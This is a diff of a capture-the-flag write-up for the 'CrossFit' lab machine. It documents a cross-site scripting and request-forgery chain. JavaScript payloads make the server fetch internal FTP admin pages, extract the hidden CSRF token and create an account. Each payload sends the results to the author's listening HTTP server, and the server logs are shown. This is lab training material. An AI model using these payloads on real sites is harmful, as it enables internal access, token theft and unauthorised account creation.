@@ -335,13 +335,16 @@ ftp                     [Status: 200, Size: 10701, Words: 3427, Lines: 369]
 
 However, loading up this URL in my browser just led to another default Apache page.  Next, I decided to see if I could use the same Cross Origin Request Forgery to get the headers of the internal page to see if there was a different view from the proper origin.  
 
-### Cross Origin Request Forgery with Javascript
+### Cross Origin Request Forgery with JavaScript
 
 TODO: add screenshot of sending request with this payload in Burp
+
+Since the `<script>` tag that triggered the cross-site scripting exploit was using JavaScript \(`alert()`\), I decided that was the best language to write a payload in to try to get the server to access the page I wanted for me.  I did a bit of research and found an easy way to make HTTP requests using JavaScript.
 
 * [https://stackoverflow.com/questions/247483/http-get-request-in-javascript](https://stackoverflow.com/questions/247483/http-get-request-in-javascript)
 
 ```javascript
+//test.js
 //testing access to ftp.crossfit.htb
 //
 var test = "http://ftp.crossfit.htb/";
@@ -350,13 +353,13 @@ request1.open('GET', test, false);
 request1.send()
 var response1 = request1.responseText;
 
+//send response1 to my waiting python http.server
 var request2 = new XMLHttpRequest();
-//send response1 to my waiting python http.server 
 request2.open('GET', 'http://10.10.14.161:8090/' + response1, true);
 request2.send()
 ```
 
-I wrote a JavaScript payload to reach out to the ftp site, then send the response back to my python http.server. 
+I wrote a JavaScript payload to reach out to the `ftp.crossfit.htb` site then send the response back to my waiting Python HTTP server. I used this instead of netcat so the server would stay active and I wouldn't have to restart it each time the server closed the connection.
 
 ```text
 ┌──(zweilos㉿kalimaa)-[~/htb/crossfit]
@@ -369,7 +372,7 @@ Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/) ...
 10.10.10.208 - - [15/Jan/2021 18:28:05] "GET /%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%20%20%20%20%3Ctitle%3EFTP%20Hosting%20-%20Account%20Management%3C/title%3E%20%20%20%20%3Clink%20href=%22https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css%22%20rel=%22stylesheet%22%3E%3C/head%3E%3Cbody%3E%3Cbr%3E%3Cdiv%20class=%22container%22%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22row%22%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22col-lg-12%20margin-tb%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22pull-left%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch2%3EFTP%20Hosting%20-%20Account%20Management%3C/h2%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22pull-right%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class=%22btn%20btn-success%22%20href=%22http://ftp.crossfit.htb/accounts/create%22%3E%20Create%20New%20Account%3C/a%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3Ctable%20class=%22table%20table-bordered%22%3E%20%20%20%20%20%20%20%20%3Ctr%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3ENo%3C/th%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3EUsername%3C/th%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3ECreation%20Date%3C/th%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%20width=%22280px%22%3EAction%3C/th%3E%20%20%20%20%20%20%20%20%3C/tr%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/table%3E%20%20%20%20%3C/div%3E%3C/body%3E%3C/html%3E HTTP/1.1" 404 -
 ```
 
-It took me a few tries, but I was able to get the server to download my script and execute it.
+It took me a few tries, but I was able to get the server to download my script and execute it.  The final response I got contained the encoded HTML for a web page.  
 
 ```markup
 <!DOCTYPE html>
@@ -410,11 +413,11 @@ It took me a few tries, but I was able to get the server to download my script a
 </html>
 ```
 
-After decoding the response I had the webpage at `http://ftp.crossfit.htb` as viewed internally.  
+After decoding the response I had the webpage at `http://ftp.crossfit.htb` as viewed internally.  I could tell right away that this was not the same default Apache server page.
 
 ![](../../.gitbook/assets/2.5-rescreate-response1.png)
 
-This was a site that sounded interesting: `http://ftp.crossfit.htb/accounts/create`.  I modified my JavaScript payload to see what was at this page.
+I saved the HTML code to a file and opened it in my browser.  The page turned out to be an account management page for FTP.  The "Create Account" button was a link to a site that sounded interesting: `http://ftp.crossfit.htb/accounts/create`.  I modified my JavaScript payload to see what was at this page.
 
 ```text
 10.10.10.208 - - [15/Jan/2021 18:41:59] "GET /test.js HTTP/1.1" 200 -
@@ -422,7 +425,7 @@ This was a site that sounded interesting: `http://ftp.crossfit.htb/accounts/crea
 10.10.10.208 - - [15/Jan/2021 18:41:59] "GET /%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%20%20%20%20%3Ctitle%3EFTP%20Hosting%20-%20Account%20Management%3C/title%3E%20%20%20%20%3Clink%20href=%22https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css%22%20rel=%22stylesheet%22%3E%3C/head%3E%3Cbody%3E%3Cbr%3E%3Cdiv%20class=%22container%22%3E%20%20%20%20%3Cdiv%20class=%22row%22%3E%20%20%20%20%3Cdiv%20class=%22col-lg-12%20margin-tb%22%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22pull-left%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Ch2%3EAdd%20New%20Account%3C/h2%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22pull-right%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class=%22btn%20btn-primary%22%20href=%22http://ftp.crossfit.htb/accounts%22%3E%20Back%3C/a%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%3C/div%3E%3C/div%3E%3Cform%20action=%22http://ftp.crossfit.htb/accounts%22%20method=%22POST%22%3E%20%20%20%20%3Cinput%20type=%22hidden%22%20name=%22_token%22%20value=%22GSlwHU3OU1s0lcF102Hku1jwvXeBtqGiAvKCjEGH%22%3E%20%20%20%20%20%3Cdiv%20class=%22row%22%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22col-xs-12%20col-sm-12%20col-md-12%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22form-group%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cstrong%3EUsername:%3C/strong%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type=%22text%22%20name=%22username%22%20class=%22form-control%22%20placeholder=%22Username%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22col-xs-12%20col-sm-12%20col-md-12%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22form-group%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cstrong%3EPassword:%3C/strong%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type=%22password%22%20name=%22pass%22%20class=%22form-control%22%20placeholder=%22Password%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22col-xs-12%20col-sm-12%20col-md-12%20text-center%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20type=%22submit%22%20class=%22btn%20btn-primary%22%3ESubmit%3C/button%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%3C/div%3E%3C/form%3E%3C/div%3E%3C/body%3E%3C/html%3E HTTP/1.1" 404 -
 ```
 
-Got back a response
+I got back a response with the encoded HTML code for the `/accounts/create` website.
 
 ```markup
 <!DOCTYPE html>
@@ -468,15 +471,13 @@ Got back a response
 </html>
 ```
 
-With this page it looked as if I could create a new account.  I would need to send a POST request to `http://ftp.crossfit.htb/accounts` with a username, password, and the value from the hidden field `token`. 
-
 ![](../../.gitbook/assets/2.5-recreate-adduser.png)
 
-* [https://www.w3docs.com/snippets/javascript/how-to-get-the-value-of-text-input-field-using-javascript.html](https://www.w3docs.com/snippets/javascript/how-to-get-the-value-of-text-input-field-using-javascript.html)
-* [https://o7planning.org/12337/parsing-xml-in-javascript-with-domparser](https://o7planning.org/12337/parsing-xml-in-javascript-with-domparser)
+With this page it looked as if I could create a new account.  I would need to send a POST request to `http://ftp.crossfit.htb/accounts` with a username, password, and the value from the hidden field `_token`. 
 
 ```javascript
-//testing access to ftp.crossfit.htb
+//test2.js
+//testing _token retrieval
 //
 var test = "http://ftp.crossfit.htb/accounts/create";
 var request1 = new XMLHttpRequest();
@@ -494,13 +495,18 @@ var parser = new DOMParser();
 var response_text = parser.parseFromString(response1, "text/html");
 var token = response_text.getElementsByName('_token')[0].value;
 
-var request3 = new XMLHttpRequest();
 //send _token value to my waiting python http.server 
+var request3 = new XMLHttpRequest();
 request3.open('GET', 'http://10.10.14.161:8090/' + token, true);
 request3.send();
 ```
 
-I modified my script to return only the hidden token.  At first I tried just reading the value of the `_token` element, but after some troubleshooting and more reading I found that the response text wasn't being properly parsed.  Once I was able to correctly parse this from the output I could send my post request to the server to create a new user.  First I had the test script send the token back to me so I could see that it worked.
+I modified my script to retrieve the hidden `_token` value.  At first, I tried just reading the value of the `_token` element out of the response, but after some troubleshooting and more reading I found that the response text wasn't being properly parsed.  
+
+* [https://www.w3docs.com/snippets/javascript/how-to-get-the-value-of-text-input-field-using-javascript.html](https://www.w3docs.com/snippets/javascript/how-to-get-the-value-of-text-input-field-using-javascript.html)
+* [https://o7planning.org/12337/parsing-xml-in-javascript-with-domparser](https://o7planning.org/12337/parsing-xml-in-javascript-with-domparser)
+
+Once I was able to correctly parse this from the output I was able to send my POST request to the server to create a new user.  First though, I had the test script send just the token back to me so I could see that it worked.
 
 ```markup
 10.10.10.208 - - [15/Jan/2021 19:37:38] "GET /test2.js HTTP/1.1" 200 -
@@ -508,9 +514,10 @@ I modified my script to return only the hidden token.  At first I tried just rea
 10.10.10.208 - - [15/Jan/2021 19:37:38] "GET /ObNaK9gJvibNxvnGNi26mA1IdM5PfI6BVme775Nc HTTP/1.1" 404 -
 ```
 
-I received the reply back, this time with only the hidden token.
+I received the reply back, this time with only the hidden `_token` value.
 
 ```javascript
+//test3.js
 //send user creation request to /accounts
 //
 //Get the response from /accounts/create with the _token
@@ -526,26 +533,28 @@ var parser = new DOMParser();
 var response_text = parser.parseFromString(response1, "text/html");
 var token = response_text.getElementsByName('_token')[0].value;
 
+//send values of 'test' for username and password and append _token
 var values = "username=test&pass=test&_token=" + token;
 
-var request2 = new XMLHttpRequest();
 //send request to my waiting python http.server for troubleshooting
+var request2 = new XMLHttpRequest();
 request2.open('POST', 'http://10.10.14.161:8090/' + values, true);
 request2.withCredentials = true;
 request2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
 request2.send();
 
-var request3 = new XMLHttpRequest();
 //send _token, username, password  to /accounts 
+var request3 = new XMLHttpRequest();
 var values = "username=test&pass=test&_token=" + token;
 request3.open('POST', 'http://ftp.crossfit.htb/accounts', false);
 request3.withCredentials = true;
+//the server needs to know what type of content it is receiving
 request3.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
 request3.send(values);
 var response3 = request3.responseText;
 
-var request4 = new XMLHttpRequest();
 //send request to my waiting python http.server with reply from account creation
+var request4 = new XMLHttpRequest();
 request4.open('GET', 'http://10.10.14.161:8090/' + response3, true);
 request4.send();
 ```
